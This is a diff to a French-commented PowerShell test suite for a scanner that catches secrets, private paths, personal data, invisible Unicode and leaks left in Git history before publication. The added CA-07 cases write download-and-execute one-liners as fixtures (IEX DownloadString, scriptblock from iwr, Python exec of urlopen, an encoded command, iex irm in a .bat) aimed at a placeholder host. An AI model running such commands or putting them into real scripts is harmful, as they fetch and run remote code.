@@ -26,9 +26,11 @@ function New-Zip([string]$dir, [string]$name, [hashtable]$files) {
   foreach ($k in $files.Keys) { W $src $k $files[$k] }
   [IO.Compression.ZipFile]::CreateFromDirectory($src, (Join-Path $dir $name))
 }
-function Expect([string]$label, [string]$dir, [string]$expected) {
+function Expect([string]$label, [string]$dir, [string]$expected, [string]$gitRoot) {
   $script:count++
-  $out = (& powershell -NoProfile -File $scanner -ArtifactPath $dir -Fast 2>&1 | Out-String).Trim()
+  $scanArgs = @('-NoProfile', '-File', $scanner, '-ArtifactPath', $dir)
+  $scanArgs += if ($gitRoot) { @('-GitRoot', $gitRoot) } else { @('-Fast') }
+  $out = (& powershell @scanArgs 2>&1 | Out-String).Trim()
   $json = $out -split "`n" | Where-Object { $_ -match '^\{' } | Select-Object -Last 1
   $obj = $null; try { $obj = $json | ConvertFrom-Json } catch {}
   $got = if ($obj.status -eq 'passed') { 'passed' } elseif ($obj) { "$($obj.stage)/$($obj.reason)" } else { 'erreur' }
@@ -72,6 +74,58 @@ try {
   $d = New-Case 'cle-utf16'; [IO.File]::WriteAllText((Join-Path $d 'notes.txt'), "TOKEN=$token`r`n", [Text.Encoding]::Unicode); Expect 'CA-05 clé dans un texte UTF-16' $d 'artifact-dlp/secret-pattern'
   $d = New-Case 'cle-docx'; New-Zip $d 'acces.docx' @{ 'word/document.xml' = "<w:t>$token</w:t>" }; Expect 'CA-03 clé dans un .docx' $d 'artifact-dlp/secret-pattern'
   $d = New-Case 'cle-bak'; New-Zip $d 'vieux.bak' @{ 'cfg.txt' = "TOKEN=$token`n" }; Expect 'CA-03 clé dans une archive renommée' $d 'artifact-dlp/secret-pattern'
+  # CA-06 : chemins privés sur un autre disque ou un partage réseau
+  $d = New-Case 'autre-disque'; W $d 'notes.md' ("Factures dans D:" + "\Clients\Dupont SARL\2026`n"); Expect 'CA-06 dossier client sur un autre disque' $d 'artifact-dlp/dlp-private-path'
+  $d = New-Case 'onedrive'; W $d 'notes.md' ("Copie dans F:" + "\OneDrive\Documents\paie.xlsx`n"); Expect 'CA-06 OneDrive sur un autre disque' $d 'artifact-dlp/dlp-private-path'
+  $d = New-Case 'unc'; W $d 'notes.md' ("Partage \\" + "SERVEUR-MAX\paie\janvier`n"); Expect 'CA-06 partage réseau nommé' $d 'artifact-dlp/dlp-private-path'
+  $d = New-Case 'chemins-neutres'; W $d 'doc.md' ("Exemples : C:\Windows\System32, C:\Program Files\App, C:\chemin\racine-autorisee, D:\data\exemple.txt, \\" + "localhost\c$\Windows, \\" + "?\C:\Windows, \\" + ".\NUL, //serveur/partage/fichier.txt`n"); Expect 'CA-06 témoin : chemins système et exemples acceptés' $d 'passed'
+
+  # CA-07 : autres formes de téléchargement-exécution et extensions de scripts
+  $dl = 'https://exemple.invalid/x'
+  $d = New-Case 'downloadstring'; W $d 'setup.ps1' ("I" + "EX (New-Object Net.WebClient).Download" + "String('$dl')`n"); Expect 'CA-07 DownloadString exécuté' $d 'artifact-sast/sast-dangerous-pattern'
+  $d = New-Case 'scriptblock'; W $d 'setup.ps1' ("& ([script" + "block]::Create((i" + "wr $dl).Content))`n"); Expect 'CA-07 scriptblock téléchargé' $d 'artifact-sast/sast-dangerous-pattern'
+  $d = New-Case 'python-exec'; W $d 'run.py' ("import urllib.request`nex" + "ec(urllib.request.url" + "open('$dl').read())`n"); Expect 'CA-07 exec Python d''un téléchargement' $d 'artifact-sast/sast-dangerous-pattern'
+  $d = New-Case 'encoded'; W $d 'run.ps1' ("powershell -Encoded" + "Command SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcABzADoA`n"); Expect 'CA-07 commande encodée' $d 'artifact-sast/sast-dangerous-pattern'
+  $d = New-Case 'bat'; W $d 'install.bat' ("powershell -c `"i" + "ex (i" + "rm $dl)`"`n"); Expect 'CA-07 téléchargement-exécution dans un .bat' $d 'artifact-sast/sast-dangerous-pattern'
+  $d = New-Case 'sast-neutre'; W $d 'tools.ps1' "Invoke-WebRequest -Uri '$dl' -OutFile x.zip`nGet-FileHash x.zip`n"; Expect 'CA-07 témoin : simple téléchargement de fichier accepté' $d 'passed'
+
+  # CA-11 : caractères invisibles supplémentaires et mélange d'alphabets
+  $d = New-Case 'word-joiner'; W $d 'a.js' ("const ok = 1;" + [char]0x2060 + "`n"); Expect 'CA-11 U+2060 invisible' $d 'artifact-sast/sast-invisible-unicode'
+  $d = New-Case 'bom-milieu'; W $d 'a.js' ("const a = 1;" + [char]0xFEFF + "`n"); Expect 'CA-11 U+FEFF au milieu du fichier' $d 'artifact-sast/sast-invisible-unicode'
+  $d = New-Case 'homoglyphe'; W $d 'a.js' ("const p" + [char]0x0430 + "ssword = 1;`n"); Expect 'CA-11 identifiant latin et cyrillique mélangés' $d 'artifact-sast/sast-homoglyph'
+  $d = New-Case 'cyrillique-ok'; W $d 'README.md' ("Привет : bonjour en russe.`n"); Expect 'CA-11 témoin : texte russe dans la documentation accepté' $d 'passed'
+
+  # CA-12 : téléphone portable et e-mail dans un nom de fichier
+  $phone = '06 12' + ' 34 56 78'   # numéro fictif, assemblé pour ne pas se signaler lui-même
+  $d = New-Case 'telephone'; W $d 'contact.md' "Tél. : $phone`n"; Expect 'CA-12 numéro de portable' $d 'artifact-dlp/dlp-pii'
+  $d = New-Case 'telephone-intl'; W $d 'contact.md' ("Tel +33 7" + " 12 34 56 78`n"); Expect 'CA-12 numéro de portable international' $d 'artifact-dlp/dlp-pii'
+  $d = New-Case 'mail-nom'; [IO.File]::WriteAllText((Join-Path $d ('export-' + $personalMail + '.csv')), "a;b`n", $utf8); Expect 'CA-12 e-mail dans un nom de fichier' $d 'artifact-dlp/dlp-pii'
+  $d = New-Case 'mail-nom-vide'; New-Item -ItemType File (Join-Path $d ('vide-' + $personalMail + '.txt')) | Out-Null; Expect 'CA-12 e-mail dans le nom d''un fichier vide' $d 'artifact-dlp/dlp-pii'
+  $d = New-Case 'dossiers-internes'; W $d 'doc.md' ("Copies : ~/.codex/skills, `$HOME/.gemini/config, %USERPROFILE%\.memento\x et `$env:USERPROFILE\.codex\y`n"); Expect 'Témoin : dossiers internes écrits avec ~ ou une variable acceptés' $d 'passed'
+  $d = New-Case 'gitignore-interne'; W $d '.gitignore' "/.memento/`n.codex/`n.gemini/`n"; W $d 'doc.md' "Copies dans ``.codex/skills/`` et ``.agents/skills/``.`n"; Expect 'Témoin : dossiers internes nommés seuls (.gitignore, doc) acceptés' $d 'passed'
+  $d = New-Case 'dossier-interne-absolu'; W $d 'doc.md' ("Base : D:\Projets\app\." + "memento\db`n"); Expect 'Dossier interne sous un chemin absolu' $d 'artifact-dlp/dlp-private-path'
+  $d = New-Case 'nombres-ok'; W $d 'notes.md' "Version 0612.3456, ticket 0612345678901, date 06/12/2026`nCANARY_TEST_ tél. 06 00 00 00 00`n"; Expect 'CA-12 témoin : nombres ordinaires et téléphone fictif acceptés' $d 'passed'
+
+  # CA-08 : données personnelles restées dans l'historique Git (mode complet)
+  function New-Repo([string]$name) {
+    $r = Join-Path $root $name; New-Item -ItemType Directory $r | Out-Null
+    git -C $r init -q -b main; git -C $r config user.name 'CANARY_TEST'; git -C $r config user.email '1+canary@users.noreply.github.com'; git -C $r config commit.gpgsign false
+    return $r
+  }
+  function New-Candidate([string]$repo) {
+    $c = "$repo-candidat"; New-Item -ItemType Directory $c | Out-Null
+    foreach ($x in @(git -C $repo ls-files)) { $dst = Join-Path $c $x; New-Item -ItemType Directory -Force (Split-Path $dst) | Out-Null; Copy-Item -LiteralPath (Join-Path $repo $x) $dst }
+    return $c
+  }
+  $r = New-Repo 'git-chemin'; W $r 'n.md' "Voir $userPath`n"; git -C $r add -A; git -C $r commit -q -m 'a'; W $r 'n.md' "propre`n"; git -C $r add -A; git -C $r commit -q -m 'b'
+  Expect 'CA-08 chemin privé effacé mais resté dans l''historique' (New-Candidate $r) 'git-dlp/dlp-private-path' $r
+  $r = New-Repo 'git-message'; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m "Jeton de secours $token"
+  Expect 'CA-08 clé écrite dans un message de commit' (New-Candidate $r) 'git-dlp/secret-pattern' $r
+  $r = New-Repo 'git-tel'; W $r 'c.md' "Tél. $phone`n"; git -C $r add -A; git -C $r commit -q -m 'a'; git -C $r rm -q c.md; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m 'b'
+  Expect 'CA-08 numéro effacé mais resté dans l''historique' (New-Candidate $r) 'git-dlp/dlp-pii' $r
+  $r = New-Repo 'git-propre'; W $r 'a.txt' "x`n"; git -C $r add -A; git -C $r commit -q -m 'Initial'
+  Expect 'CA-08 témoin : historique propre accepté' (New-Candidate $r) 'passed' $r
+
   $d = New-Case 'gros-texte'; $sb = New-Object Text.StringBuilder; [void]$sb.Append(('x' * 100 + "`n") * 105000); [IO.File]::WriteAllText((Join-Path $d 'journal.log'), $sb.ToString()); Expect 'CA-05 fichier texte > 10 Mo refusé' $d 'artifact-dlp/unscanned-text-file'
 } finally {
   Remove-Item -Recurse -Force -LiteralPath $root -ErrorAction SilentlyContinue
